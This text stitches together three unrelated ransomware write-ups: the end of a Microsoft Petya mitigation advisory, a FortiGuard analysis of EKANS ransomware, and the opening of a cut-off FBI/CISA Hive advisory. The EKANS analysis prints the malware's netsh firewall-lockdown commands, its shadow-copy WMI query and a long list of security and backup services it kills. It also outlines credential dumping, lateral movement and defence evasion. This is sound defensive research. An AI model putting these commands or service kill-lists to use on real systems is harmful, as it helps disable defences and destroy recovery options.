patient-zero:\n\nWith Windows Defender ATP, enterprise customers are well-equipped to quickly identify Petya outbreaks,\ninvestigate the scope of the attack, and respond early to malware delivery campaigns.\n\nProtection against this new ransomware attack\n\nKeeping your Windows 10 up-to-date gives you the benefits of the latest features and proactive mitigations built\ninto the latest versions of Windows. In Creators Update, we further hardened Windows 10 against ransomware\nattacks by introducing new next-gen technologies and enhancing existing ones.\n\nAs another layer of protection, Windows 10 S only allows apps that come from the Windows Store to run.\nWindows 10 S users are further protected from this threat.\n\nhttps://www.microsoft.com/en-us/windows/windows-10-upgrade\nhttps://support.microsoft.com/en-us/help/311047/how-to-keep-your-windows-computer-up-to-date\nhttps://blogs.technet.microsoft.com/mmpc/2017/06/08/windows-10-creators-update-hardens-security-with-next-gen-defense/\nhttps://www.microsoft.com/en-us/windows/windows-10-s\n\n\n11/13\n\nWe recommend customers that have not yet installed security update MS17-010 to do so as soon as possible.\nUntil you can apply the patch, we also recommend two possible workarounds to reduce the attack surface:\n\nDisable SMBv1 with the steps documented at Microsoft Knowledge Base Article 2696547 and as\nrecommended previously\nConsider adding a rule on your router or firewall to block incoming SMB traffic on port 445\n\nAs the threat targets ports 139 and 445, you customers can block any traffic on those ports to prevent\npropagation either into or out of machines in the network. You can also disable remote WMI and file sharing.\nThese may have large impacts on the capability of your network, but may be suggested for a very short time\nperiod while you assess the impact and apply definition updates.\n\nAside from exploiting vulnerabilities, this threat can also spread across networks by stealing credentials, which it\nthen uses to attempt to copy and execute a copy on remote machines. You can prevent credential theft by\nensuring credential hygiene across the organization. Secure privileged access to prevent the spread of threats\nlike Petya and to protect your organization’s assets. Use Credential Guard to protect domain credentials stored in\nthe Windows Credential Store.\n\nWindows Defender Antivirus detects this threat as Ransom:Win32/Petya as of the 1.247.197.0 update. Windows\nDefender Antivirus uses cloud-based protection, helping to protect you from the latest threats.\n\nFor enterprises, use Device Guard to lock down devices and provide kernel-level virtualization-based security,\nallowing only trusted applications to run, effectively preventing malware from running.\n\nMonitor networks with Windows Defender Advanced Threat Protection, which alerts security operations teams\nabout suspicious activities. Download this playbook to see how you can leverage Windows Defender ATP to\ndetect, investigate, and mitigate ransomware in networks: Windows Defender Advanced Threat Protection –\nRansomware response playbook.\n\nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced\nattacks, sign up for a free trial.\n\nResources\n\nMSRC blog:

Over the last few years, the impact has worsened due to adversaries moving to a more\ntargeted attack method, rather than the traditional “spray and pray” method of infecting as many potential victims as possible. \n\nThis up-front investment in time and resources has shown to be fruitful for attackers, especially as they focus on specific industries,\nwith healthcare as well as states and local governments emerging as high-profile targets during the course of 2020. The latest\nindustry targeted with ransomware is Industrial Control Systems/Operational Technology. This blog will break down at a high level the\nlatest EKANS ransomware, general TTP trends, and related protections for targeted ransomware attacks.\n\nAffected platforms: Windows Operating Systems\n Impacted parties: Industrial Control Systems and a variety of applications\n\n Impact: Data Encryption for Impact – Mitre ID:T1486\nSeverity level: High\n\n \n\nEKANS Ransomware \n\nThrough one of our trusted partnerships, FortiGuard Labs was provided with an EKANS sample to analyze around the end of May. A\nmore recent June version was independently sourced by FortiGuard Labs.\n\nMD5 SHA256\n\nMay Variant\n\n47EBE9F8F5F73F07D456EC12BB49C75D 2ED3E37608E65BE8B6E8C59F8C93240BD0EFE9A60C08C21F4889C00EB6082D74\n\nJune Variant\n\nED3C05BDE9F0EA0F1321355B03AC42D0 D4DA69E424241C291C173C8B3756639C654432706E7DEF5025A649730868C4A1\n\nhttps://www.fortinet.com/blog/threat-research/ekans-ransomware-targeting-ot-ics-systems\nhttps://www.fortinet.com/blog/search?author=Ben+Hunter\nhttps://www.fortinet.com/blog/search?author=Fred+Gutierrez\nhttps://www.fortinet.com/resources/cyberglossary/ransomware?utm_source=blog&utm_campaign=ransomware\nhttps://www.verizon.com/business/resources/reports/dbir/\nhttps://www.fortinet.com/resources/cyberglossary/malware?utm_source=blog&utm_campaign=malware\nhttps://www.fortinet.com/solutions/industries/healthcare?utm_source=blog&utm_campaign=healthcare\nhttps://www.fortinet.com/solutions/industries/government/state-and-local?utm_source=blog&utm_campaign=state-and-local\nhttps://www.fortinet.com/solutions/industries/scada-industrial-control-systems/what-is-ot-security?utm_source=blog&utm_campaign=scada-industrial-control-systems/what-is-ot-security\nhttps://www.fortinet.com/fortiguard/labs.html?utm_source=blog&utm_medium=campaign&utm_campaign=FortiGuardLabs\n\n\n2/14\n\nEach of these samples are written in the GO programming language. The GO programming language first appeared around 2009\nand has slowly gained popularity within the malware community. \n\nThe Difficulty of Analyzing EKANS Malware - “Go”ing to Create a Custom IDA Plugin\n\nOne of the advantages of GO is that the code can be easily compiled to work on different platforms and architectures, such as\nMacOS, Microsoft Windows, and the Linux operating system when compared to other programming languages. One of the\ndisadvantages, however, is that the binaries are noticeably larger in size. A simple “Hello World” program can produce a binary 1 MB\nin size. To combat bulky file sizes, GO allows a programmer to strip binaries during compilation. Most of the information that gets\nremoved is typically used by debuggers.\n\nAs it turns out, this size problem is actually helpful to malware authors. By having a larger file size, manual analysis will inevitably\ntake longer. Moreover, it can easily be overlooked since typical malware files have a much smaller file size in the first place. By\nstripping the binaries of debugging information, malware analysts will have another stumbling block to overcome. \n\n \nLooking at the given files closer, we can see that they are indeed stripped and offer no clues for the malware analyst.\n\nFigure 1. Number of Functions to Analyze\n\nThe typical malware may have hundreds of functions, and some will already be recognized in the malware analysis industry’s\nunofficial default disassembler, IDA. With stripped GO binaries, however, IDA is unable to recognize normal library files, leaving the\nmalware analyst with more than 5000 functions to sift through. \n\nBecause of this problem, we developed an EKANS-specific IDA plugin in-house to help with analysis in conjunction with other GO-\nspecific analysis techniques.\n\nFigure 2. Custom IDA Plugin Developed by FortiGuard Labs\n\nAs can be seen above, there are over 2100 encrypted strings, almost 2400 obfuscated function names, and over 1200 strings that\nneeded fixing in the May variant of EKANS.\n\nBoth of these variants perform all of the typical ransomware activities you would expect, such as encrypting files and leaving a\nransom note telling the victim to contact them at a specified email address, to receive instructions on how to pay a ransom and\ndecrypt their files. But they also perform actions that are not so typical. Below is a high-level list of these activities in sequence, with\nthe main notable difference of turning off the host firewall, found in the June variant:\n\n \nConfirms Target Environment \nIsolates the Infected System (Host Firewall) \nThe public RSA Key used in the file encryption process is decoded\nIdentifies and Stops Specific Services and Processes\nDeletes Shadow Copy \nEncrypts Files \nTurns Off Host Firewall\n\nFigure 3. High-Level Flow of EKANS ransomware functions\n\nIt is important to note that turning off the host firewall seems to have been a new addition to the malware family’s functionality. This\nwas not present in the older May variant. Another interesting addition was to turn on the firewall before encrypting, probably to detect\nAVs and other defense solutions by blocking any communication from the agent.\n\nConfirming the Target Environment for EKANS Ransomware\n\nThe ransomware starts out by attempting to confirm its target by resolving the domain belonging to the victim’s company, as well as\ncomparing the resolved domain to a specific IP. If the domain/IP is not available, the routine exits. \n\nFigure 4. Malware confirming its target\n\nLooking deeper into the environmental checks, we noticed that the May variant of EKANS tries to resolve the IP address of the\nADS.****.COM. The subdomain belongs to a global health care provider that specializes in the treatment of chronic kidney\nconditions.\n\nFigure 5. Subdomain IP Check\n\nhttps://www.fortinet.com/resources/cyberglossary/encryption?utm_source=blog&utm_campaign=encryption\nhttps://www.fortinet.com/resources/cyberglossary/firewall?utm_source=blog&utm_campaign=firewall\n\n\n3/14\n\nThis subdomain does not seem to be publicly available, which means that the May variant will only execute if it has infiltrated the\nnetwork. If this is successful, then another check is performed. EKANS checks to see if “10.2.10.4” is the IP address of this\nsubdomain.\n\nFigure 6. IP Compare\n\nAnother piece of information that the May variant of EKANS is looking for is the current machine’s role within the domain.\n\nFigure 7. Domain Role Check\n\nA WMI query will be performed to determine this. Microsoft defines domain roles as the following.\n\n0 Standalone Workstation\n\n1 Member Workstation\n\n2 Standalone Server\n\n3 Member Server\n\n4 Backup Domain Controller\n\n5 Primary Domain Controller\n\nEKANS is apparently looking to infect a domain controller on the network. If successful, this can affect security authentication\nrequests within the network domain, thereby severely impacting networked users. With the aforementioned data points, EKANS will\nhave enough to build a proper mutex.\n\nFigure 8. Mutex Creation\n\nThe mutex will consist of the string “Global\\” appended with “EKANS” and a part of the IP string. On a side note, the author(s) of\nEKANS may be a fan of The Highlander movies/TV series where the phrase “there can be only one” was popularized.\n\nFigure 9. Exit Message\n\nIsolating a System Infected by EKANS Ransomware\n\nThe next step taken by the June variant of the ransomware that FortiGuard Labs engineers encountered was that the malware\nexecuted the following netsh commands in order to block any inbound and outbound traffic that might interfere with the encryption\nprocess:\n\n \nnetsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound\nnetsh advfirewall set allprofiles state on \n\nFigure 10. Malware isolating infected system\n\nFigure 11. netsh.exe running to change host firewall settings.\n\nDecoding EKANS Ransomware’s Public RSA Key\n\nNext, the malware goes through its encryption functions, which like many ransomware variants are embedded in the malware. It\nencrypts data using RSA and by parsing the public key using the ParsePKCS1PublicKey function. It is XOR decoded.\n\nFigure 12. RSA key decoded\n\nFigure 13. Public key being parsed by the ParsePKCS1PublicKey function\n\nEKANS Malware Identifies and Stops Services and Processes \n\nIn both variants, EKANS will decode strings associated with services and attempt to stop them. The May variant, for some reason,\ncontains duplicate services.\n\n \n\nhttps://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-computersystem\n\n\n4/14\n\nFigure 14. Service Redundancy\n\nOverall, there are nine services that are repeatedly decrypted in an attempt to stop them by the May variant of EKANS. They are: \n\nMSSQLFDLauncher$PROFXENGAGEMENT, ReportServer$TPS, SQLBrowser, MSSQLServerADHelper, SQLAgent$PROD,\nmsftesql$PROD, SQLAgent$SOPHOS, VeeamEnterpriseManagerSvc, and ArcserveUDPPS\n\nAfter decoding all the required strings (see Appendix A), both variants of the ransomware open the SCM (OpenSCManager) and use\nEnumServicesStatusEx. It iterates on the services and stops any service contained in the decoded string list. \n\nThe service stop operation stops:\n\nOpenService (SC_MANAGER_ENUMERATE_SERVICE)\nServiceControl (SERVICE_CONTROL_STOP)\nServiceQuery \n\nFigure 15. Identifies and stops specific services.\n\nEKANS Also Identifies and Kills Processes \n\nThe ransomware then enumerates running processes and terminates each process within a predefined process list (See Appendix-\nB). The following code handles the process termination:\n\n \nFigure 16. Malware terminates specific processes.\n\nEKANS Deletes Shadow Copies\n\nEKANS then deletes shadow copies, which is done via WMI’s WbemScripting.SWbemNamedValueSet object. The query that locates\nthe shadow copies object is the regular:\n\nSELECT * FROM Win32_ShadowCopy\n\nThis is common behavior with ransomware to make it more difficult to recover files. There are many ways to achieve this. If you’re\ninterested in learning more, please read Ben Hunter’s “Stomping Shadow Copies – A second Look into Deletion Methods” blog. \n\nThe May variant accomplishes this by using COM programming. EKANS connects to the WMI service via COM objects in order to\nuse shared libraries utilizing code similar to https://raw.githubusercontent.com/go-ole/go-ole/master/guid.go, which is used by various\nother legitimate GO software, as well as other malicious binaries.\n\nFigure 17. COM Objects Used\n\nEKANS Ransomware Encrypts Files \n\nBefore running the encryption function, the ransomware decodes the strings of all of the relevant file extensions to encrypt, (see\nAppendix-C). \n\n \nIn order to keep the system able to at least spin up and load, certain files and folders are skipped from the encrypting process. These\nfiles are avoided in the May variant of EKANS.\n\nFigure18. Files Avoided by the May Variant\n\nAt the same time, any files and folders that contain the following directories in their path are also skipped from the file encryption\nprocess by the May variant.\n\nFigure 19. Folders Avoided by May Variant\n\nThe following file types are also avoided by the May variant.\n\nFigure 20. File types Avoided by May Variant\n\nBoth variants also build the following regex used to exclude encryption targets.\n\nFigure 21. Malware excluding encryption targets\n\nHowever, during the actual file encryption process, the list of targeted file types is not actually checked by the May variant of the\nransomware. The May variant will encrypt any file type as long as it does not violate any of its avoidance rules.\n\nhttps://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods\nhttps://raw.githubusercontent.com/go-ole/go-ole/master/guid.go\n\n\n5/14\n\nThe encryption details seem identical to the operating methods described here: https://www.ccn-cert.cni.es/pdf/5045-ccn-cert-id-15-\n20-snake-locker-english-1/file.html\n\nA public RSA key is used to encrypt each of the AES keys used to encrypt files.\nFile encryption is via AES CTR mode, with a random key and a random IV.\nThe AES key is ciphered with RSA-OAEP, and uses ripemd160 as its hashing algorithm.\nThe AES encrypted key, along with the original file name, is encoded using GOB (an algorithm from Golang), and it is written at\nthe end of the file.\n\nFirst, it enumerates all valid drive letters from A to Z using GetLogicalDriveStringsW. \n\nFigure 22. Drive Enumeration\n\nInterestingly enough, the code shown in the figure below shows that the May variant of EKANS only targets removable drives (such\nas thumb drives) and fixed drives (such as hard disks or flash storage devices). They do not try to infect machines on the network. \n\nFigure 23. Drive Types Targeted\n\nIt then creates multiple threads for such drives.\n\nFigure 24. Enumerating valid drive letters.\n\nEach thread then creates eight workers (threads) that perform the encryption. These workers use channels to sync themselves. \n\nFigure 25. Threads performing encryption\n\nAfter creating the eight workers, the thread waits for them to finish. After all of them are done, it renames the files on the system by\ngenerating a random 5-digits string which is then appended to the file’s name.\n\nFigure 26. Malware renaming files.\n\nThe single file encryption flow is relatively simple:\n\nOpens a file\nChecks to see if it already has the EKANS stamp at the file’s end. If not, it encrypts the file via AES as seen in the following\nloop:\nEncryption (it overwrites the file, not creating a new one)\n\nFirst, initiates a cipher:\n\nFigure 27. Malware initiates Cipher\n\nAfter the encryption process has completed, the May variant of EKANS drops the ransom note as “Decrypt-Your-Files.txt” either on\nthe root system drive or on the user’s desktop. \n\nFigure 28. Ransom Note\n\nFinally, EKANS Turns Off Host Firewall\n\nFor machines infected with the June variant, the ransomware ends with another command to turn off the firewall. \n\nEKANS Mitre TTPs\n\nExecution\n\nComponent Object Model and Distributed COM (Mitre ATT&CK ID: T1175)\nEKANS executes WMI queries via COM objects\n\nDefense Evasion\n\nDisabling Security Tools (Mitre ATT&CK ID: T1089)    \nEKANS attempts to disable processes and kill services (see Appendix)\n\nExecution Guardrails (Mitre ATT&CK ID: T1480)\nEKANS will check network, IP, and domain role\n\nhttps://www.ccn-cert.cni.es/pdf/5045-ccn-cert-id-15-20-snake-locker-english-1/file.html\nhttps://attack.mitre.org/techniques/T1175/\nhttps://attack.mitre.org/techniques/T1089/\nhttps://attack.mitre.org/techniques/T1480/\n\n\n6/14\n\nIndirect Command Execution (Mitre ATT&CK ID: T1202)\nnetsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound\nnetsh advfirewall set allprofiles state on\n\nVirtualization/Sandbox Evasion (Mitre ATT&CK ID: T1497)\nEKANS attempts to disable virtualization services and processes (see Appendix)\n\nDiscover\n\nFile and Directory Discovery (Mitre ATT&CK ID: T1083)\nEKANS builds a list of files and directories that need to be encrypted\n\nPeripheral Device Discovery (Mitre ATT&CK ID: T1120)\nEKANS will attempt to encrypt files on removable drives such as USB drives\n\nProcess Discovery (Mitre ATT&CK ID: T1057)\nEKANS will attempt to terminate certain processes (see Appendix)\n\nSecurity Software Discovery (Mitre ATT&CK ID: T1063)\nEKANS will attempt to disable certain security software (see Appendix)\n\nSoftware Discovery (Mitre ATT&CK ID: T1518)\nEKANS will attempt to disable certain ICS processes (see Appendix)\n\nSystem Information Discovery (Mitre ATT&CK ID: T1082)\nEKANS checks for the existence of a mutex\nEKANS checks for the system’s role in the domain\n\nSystem Network Configuration Discovery (Mitre ATT&CK ID: T1049)\nEKANS queries the network to see if it is part of the targeted domain\n\nSystem Service Discovery (Mitre ATT&CK ID: T1007)\nEKANS will attempt to halt certain services (see Appendix)\n\nVirtualization/Sandbox Evasion (Mitre ATT&CK ID: T1497)\nEKANS attempts to disable virtualization services and processes (see Appendix)\n\nImpact\n\nData Encrypted for Impact (Mitre ATT&CK ID: T1486)\nEKANS will encrypt certain files to be ransomed\n\nInhibit System Recovery (Mitre ATT&CK ID: T1490)\nEKANS deletes shadow copies to prevent recovery of encrypted files\n\nNetwork Denial of Service (Mitre ATT&CK ID: T1498)\nInfected domain controllers may prevent users from logging into the network\n\nService Stop (Mitre ATT&CK ID: T1489)\nEKANS will attempt to halt certain services (see Appendix)\n\nGeneral TTP Trends \n\nUnderstanding the ransomware and some of its indicators of compromise (IOC), such as hashes, URLs, IP addresses, and domains\nis a good first defense. But be warned that these IOCs often change and can circumvent legacy security controls. And because these\nattacks are more targeted, it’s also important to understand the activity the offensive operator takes once they’re in the environment.\nIf you can disrupt their plans prior to the malware executing, the better off you will be. While every targeted attack is unique, there are\nsome trends – especially in the way an attacker works – that if understood can provide a better view into your ability to detect their\nattack methods and more effectively block them. \n\nLet’s take a look into some of the trends we often see from our FortiGuard Managed Detection and Response and Incident Response\nServices. \n\nInitial Access\n\nThere are many ways to access a network, but the two we continue to observe are:\n\nhttps://attack.mitre.org/techniques/T1202/\nhttps://attack.mitre.org/techniques/T1497/\nhttps://attack.mitre.org/techniques/T1083/\nhttps://attack.mitre.org/techniques/T1057/\nhttps://attack.mitre.org/techniques/T1063/\nhttps://attack.mitre.org/techniques/T1049/\nhttps://attack.mitre.org/techniques/T1486/\nhttps://attack.mitre.org/techniques/T1490/\nhttps://attack.mitre.org/techniques/T1498/\nhttps://attack.mitre.org/techniques/T1489/\nhttps://www.fortinet.com/resources/cyberglossary/indicators-of-compromise?utm_source=blog&utm_campaign=indicators-of-compromise\nhttps://www.fortinet.com/content/dam/fortinet/assets/solution-guides/sb-fortiresponder-services-turn-alerts-into-actions.pdf\n\n\n7/14\n\nExternal Remote Services (Mitre ATT&CK ID:T1133)\nExploiting existing vulnerabilities and weak credentials on RDP sessions that are publicly exposed. \n\nSpear phishing Attachments and Links (Mitre ATT&CK ID:T1193 and ID:T1192)\nThe malware delivery of choice these days is still by sending a spear phishing email.\n\nOS Credential Dumping \n\nOnce the adversary establishes their initial access into the environment, they need to continue penetrating deeper into the network.\nTo do so, they first need the right access, which is why credential dumping is a common activity. There are many techniques to\nachieve the dumping of credentials, as the Windows Operating System has many different places it stores or caches its credentials.\nBelow is one common technique we see as a trend:\n\nOS Credential Dumping – LSASS Memory (Mitre ATT&CK ID:T1003.001)\nThe LSASS process stores credentials of users that are logged in to a system. Many tools are available to extract this\ncredential information.\n\nIf you want to read more on OS Credential Dumping, please view our Offense and Defense – A Tale of Two Sides: (Windows) OS\nCredential Dumping blog. \n\nLateral Movement \n\nWhen the adversary has the right access to spread their malware from system to system, they simply need to copy and remotely\nexecute the payload. One tool that can achieve just that is found on many Windows Operating Systems. It is called PSEXEC, which\nis part of the Sysinternals. This tool is used by many system admins to help administer the network, but it is also often used by the\nadversary. \n\nLateral Tool Transfer (Mitre ID:T1570)\nMany tools can be used to copy and remotely execute a piece of software. The PSEXEC tool is one of them. When\npsexec.exe runs, it will copy the psexecsvc.exe file to the remote system, which is used to start and run the malicious\nsoftware as a service. It’s also worth mentioning that it will use Windows admin shares such as C$, IPS$, ADMIN$.\n\nDefensive Evasion \n\nAs a security community we have gotten better at identifying malicious software and tools. As a result, adversaries have had to take\nthat into consideration by adding additional steps to disable defensive controls such as anti-malware, or by disabling Windows event\nlogging. \n\nImpair Defenses - Disable or Modify Tools (Mitre ID:T1562.001)\nIf the adversary has administrator access it may be possible to uninstall or shutdown services such as Microsoft Defender.\nThey will uninstall the service, run their malware, and then reinstall the services. \n\nImpair Defenses - Disable Windows Event Logging (Mitre ID:T1562.002)\n Logs are a great source for detecting anomalies on your hosts, and companies are collecting these logs centrally and\nmonitoring them for those anomalies. To address this process, adversaries will disable event logging or suppress logs so\nthey can’t be viewed by the monitoring tool or process. \n\nDefensive Evasion/Privilege Escalation/Persistence \n\nEventually, the attacker will execute the ransomware (or malware in general) on targeted systems. An efficient way to do this, if the\nattacker has access to the domain controllers, is to leverage group policies (GPO) and Windows login scripts. GPOs and login scripts\nare used by system admins for central management and OS configuration setting for users’ environments. These tools, which are\npart of an Active Directory environment, are modified by an attacker to deploy and execute their malware. \n\nGroup Policy Modification (GPO) (Mitre ID:T1484)\nThe attacker can create a group policy preference scheduled task policy within a Default Domain Policy that will deliver\nthe malware and execute it on all machines within the AD domain. \n\nBoot or Logon Initialization Scripts: Login Script – Windows (Mitre ID:T1037.001)\nBecause logon scripts can be run when users login to systems in an AD domain, an attacker can add their malicious\npayload to the script to execute. \n\nConclusion: Prepare for Ransomware Threats Beyond EKANS\n\nhttps://attack.mitre.org/techniques/T1133/\nhttps://attack.mitre.org/techniques/T1193/\nhttps://attack.mitre.org/techniques/T1192/\nhttps://attack.mitre.org/beta/techniques/T1003/001/\nhttps://www.fortinet.com/blog/threat-research/offense-and-defense-a-tale-of-two-sides-windows-os-credential-dumping\nhttps://attack.mitre.org/beta/techniques/T1570/\nhttps://attack.mitre.org/beta/techniques/T1562/001/\nhttps://attack.mitre.org/beta/techniques/T1562/002/\nhttps://attack.mitre.org/beta/techniques/T1484/\nhttps://attack.mitre.org/beta/techniques/T1037/001/\n\n\n8/14\n\nIn this blog we focused on not only one of the latest ransomware variants targeting ICS/OT environments, but also some of the TTP\ntrends our FortiGuard team has observed over the last year or two. We encourage you to take a look at not only the techniques we\ndescribed here, but also at the other techniques that are documented in the Mitre ATT&CK knowledge base. Then start testing your\ncurrent security controls against these techniques to ensure you can detect or protect against them. \n\nIf you find gaps, document them and use them as a guide to build a prioritized action plan for improvement. Lastly, if you are\nresponsible for the ICS environment there is now a Mitre ATT&CK ICS knowledge base specifically for adversary actions taking place\nin an Industrial Control System network. \n\nHow Fortinet Protects Organizations from EKANS\n\nFortinet offers a suite of platforms and services to help protect organizations from ransomware and malware, including EKANS.\nHere’s how it works:\n\nFortiEDR Platform: Identification & Blocking of EKANS\n\nFortinet’s FortiEDR Platform detects and blocks the EKANS malware. When activity tries to run, such as changing the Windows\nfirewall settings or encrypting files, FortiEDR identifies and blocks the malicious activity. \n\n \nFigure 29. FortiEDR blocking malicious netsh.exe activity.\n\nFigure 30. FortiEDR identifying specific command line activity.\n\nFigure 31. FortiEDR blocking the file encryption activity.\n\nFortiGuard Anti-Virus Services \n\nThese ransomware variants are blocked with the signatures W32/Ekans.42D0!tr.ransom, W32/Ekans.C75D!tr.ransom, and\nW32/Ekans.62B8!tr.ransom. \n\nFortiDeceptor: Deception-based Breach Protection\n\nFortiDeceptor allows organizations to rapidly create a fabricated deception network through the automatic deployment of decoys and\nlures that seamlessly integrate with an existing IT/OT infrastructure, enticing attackers into revealing themselves. FortiDeceptor helps\nserve as an early warning system by providing accurate detection that correlates an attacker’s activity details and lateral movement\nthat feeds up to a broader threat campaign. Threat intelligence captured from decoys is shared within the Security Fabric so\nautomatic protection can be applied, disrupting attacks before any real damage is done.\n\n \n\nAppendix A – Services Targeted by EKANS \n\nMay Variant\n\nAcronis VSS Provider, Enterprise Client Service, Sophos Agent, Sophos AutoUpdate Service, Sophos Clean Service, Sophos Device\nControl Service, Sophos File Scanner Service, Sophos Health Service, Sophos MCS Agent, Sophos MCS Client, Sophos Message\nRouter, Sophos Safestore Service, Sophos System Protection Service, Sophos Web Control Service, SQLsafe Backup Service,\nSQLsafe Filter Service, Symantec System Recovery, Veeam Backup Catalog Data Service, AcronisAgent, AcrSch2Svc, Antivirus,\nARSM, BackupExecAgentAccelerator, BackupExecAgentBrowser, BackupExecDeviceMediaService, BackupExecJobEngine,\nBackupExecManagementService, BackupExecRPCService, BackupExecVSSProvider, bedbg, DCAgent, EPSecurityService,\nEPUpdateService, EraserSvc11710, EsgShKernel, FA_Scheduler, IISAdmin, IMAP4Svc, macmnsvc, masvc, MBAMService,\nMBEndpointAgent, McAfeeEngineService, McAfeeFramework, McAfeeFrameworkMcAfeeFramework, McShield, McTaskManager,\nmfemms, mfevtp, mozyprobackup, MsDtsServer, MsDtsServer100, MsDtsServer110, MSExchangeES, MSExchangeIS,\nMSExchangeMGMT, MSExchangeMTA, MSExchangeSA, MSExchangeSRS, MSOLAP$SQL_2008, MSOLAP$SYSTEM_BGC,\nMSOLAP$TPS, MSOLAP$TPSAMA, MSSQL$BKUPEXEC, MSSQL$ECWDB2, MSSQL$PRACTICEMGT,\nMSSQL$PRACTTICEBGC, MSSQL$PROFXENGAGEMENT, MSSQL$SBSMONITORING, MSSQL$SHAREPOINT,\nMSSQL$SQL_2008, MSSQL$SYSTEM_BGC, MSSQL$TPS, MSSQL$TPSAMA, MSSQL$VEEAMSQL2008R2,\nMSSQL$VEEAMSQL2012, MSSQLFDLauncher, MSSQLFDLauncher$PROFXENGAGEMENT,\nMSSQLFDLauncher$SBSMONITORING, MSSQLFDLauncher$SHAREPOINT, MSSQLFDLauncher$SQL_2008,\nMSSQLFDLauncher$SYSTEM_BGC, MSSQLFDLauncher$TPS, MSSQLFDLauncher$TPSAMA, MSSQLSERVER,\nMSSQLServerADHelper100, MSSQLServerOLAPService, MySQL57, ntrtscan, OracleClientCache80, PDVFSService, POP3Svc,\nReportServer, ReportServer$SQL_2008, ReportServer$SYSTEM_BGC, ReportServer$TPS, ReportServer$TPSAMA, RESvc,\nsacsvr, SamSs, SAVAdminService, SAVService, SDRSVC, SepMasterService, ShMonitor, Smcinst, SmcService, SMTPSvc, SNAC,\nSntpService, sophossps, SQLAgent$BKUPEXEC, SQLAgent$ECWDB2, SQLAgent$PRACTTICEBGC,\nSQLAgent$PRACTTICEMGT, SQLAgent$PROFXENGAGEMENT, SQLAgent$SBSMONITORING, SQLAgent$SHAREPOINT,\n\nhttps://attack.mitre.org/\nhttps://collaborate.mitre.org/attackics/index.php/Main_Page\nhttps://www.fortinet.com/products/endpoint-security/fortiedr.html?utm_source=blog&utm_campaign=2020-q1-fortiedr\nhttps://www.fortinet.com/products/fortideceptor.html?utm_source=blog&utm_campaign=2019-q4-deception\nhttps://www.fortinet.com/solutions/industries/scada-industrial-control-systems.html?utm_source=blog&utm_campaign=2018-q2-OT-Fortinet-page\nhttps://www.fortinet.com/solutions/enterprise-midsize-business/security-fabric.html?utm_source=reuters&utm_campaign=2018-reuters-security-fabric\n\n\n9/14\n\nSQLAgent$SQL_2008, SQLAgent$SYSTEM_BGC, SQLAgent$TPS, SQLAgent$TPSAMA, SQLAgent$VEEAMSQL2008R2,\nSQLAgent$VEEAMSQL2012, SQLBrowser, SQLSafeOLRService, SQLSERVERAGENT, SQLTELEMETRY,\nSQLTELEMETRY$ECWDB2, SQLWriter, SstpSvc, svcGenericHost, swi_filter, swi_service, swi_update_64, TmCCSF, tmlisten,\nTrueKey, TrueKeyScheduler, TrueKeyServiceHelper, UI0Detect, VeeamBackupSvc, VeeamBrokerSvc, VeeamCatalogSvc,\nVeeamCloudSvc, VeeamDeploymentService, VeeamDeploySvc, VeeamEnterpriseManagerSvc, VeeamMountSvc, VeeamNFSSvc,\nVeeamRESTSvc, VeeamTransportSvc, W3Svc, wbengine, WRSVC, VeeamHvIntegrationSvc, swi_update, SQLAgent$CXDB,\nSQLAgent$CITRIX_METAFRAME, SQL Backups, MSSQL$PROD, Zoolz 2 Service, MSSQLServerADHelper, SQLAgent$PROD,\nmsftesql$PROD, NetMsmqActivator, EhttpSrv, ekrn, ESHASRV, MSSQL$SOPHOS, SQLAgent$SOPHOS, klnagent,\nMSSQL$SQLEXPRESS, SQLAgent$SQLEXPRESS, kavfsslp, KAVFSGT, KAVFS, mfefire, avast!

Visit\nstopransomware.gov to see all #StopRansomware\nadvisories and to learn more about other ransomware\nthreats and no-cost resources.\n\nActions to Take Today to Mitigate\nCyber Threats from Ransomware:\n Prioritize remediating known\nexploited vulnerabilities.\n Enable and enforce multifactor\nauthentication with strong\npasswords.\n Close unused ports and remove\nany application not deemed\nnecessary for day-to-day\noperations.\n\nThe Federal Bureau of Investigation (FBI), the\nCybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human\nServices (HHS) are releasing this joint CSA to disseminate known Hive IOCs and TTPs identified\nthrough FBI investigations as recently as November 2022.\nFBI, CISA, and HHS encourage organizations to implement the recommendations in the Mitigations\nsection of this CSA to reduce the likelihood and impact of ransomware incidents. Victims of\nransomware operations should report the incident to their local FBI field office or CISA. For a\ndownloadable copy of IOCs, see AA22-321A.stix (STIX, 43.6 kb).\n\nTECHNICAL DETAILS\nNote: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See MITRE\nATT&CK for Enterprise for all referenced tactics and techniques.\nAs of November 2022, Hive ransomware actors have victimized over 1,300 companies worldwide,\nreceiving approximately US$100 million in ransom payments, according to FBI information. Hive\nTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact\nyour local FBI field office at fbi.gov/contact-us/field-offices. When available, please include the following\ninformation regarding the incident: date, time, and location of the incident; type of activity; number of people\naffected; type of equipment used for the activity; the name of the submitting company or organization; and a\ndesignated point of contact. To request incident response resources or technical assistance related to these\nthreats, contact CISA at Report@cisa.dhs.gov.\nThis document is marked TLP:CLEAR. Disclosure is not limited.

Subject to standard copyright rules, TLP:CLEAR information may be distributed without restriction. For\nmore information on the Traffic Light Protocol, see cisa.gov/tlp/.\n\nTLP: CLEAR\n\nTLP:CLEAR\nransomware follows the ransomware-as-a-service (RaaS) model in which developers create,\nmaintain, and update the malware, and affiliates conduct the ransomware attacks. From June 2021\nthrough at least November 2022, threat actors have used Hive ransomware to target a wide range of\nbusinesses and critical infrastructure sectors, including Government Facilities, Communications,\nCritical Manufacturing, Information Technology, and especially Healthcare and Public Health (HPH).\nThe method of initial intrusion will depend on which affiliate targets the network. Hive actors have\ngained initial access to victim networks by using single factor logins via Remote Desktop Protocol\n(RDP), virtual private networks (VPNs), and other remote network connection protocols [T1133]. In\nsome cases, Hive actors have bypassed multifactor authentication (MFA) and gained access to\nFortiOS servers by exploiting Common Vulnerabilities and Exposures (CVE) CVE-2020-12812. This\nvulnerability enables a malicious cyber actor to log in without a prompt for the user’s second\nauthentication factor (FortiToken) when the actor changes the case of the username.\nHive actors have also gained initial access to victim networks by distributing phishing emails with\nmalicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft\nExchange 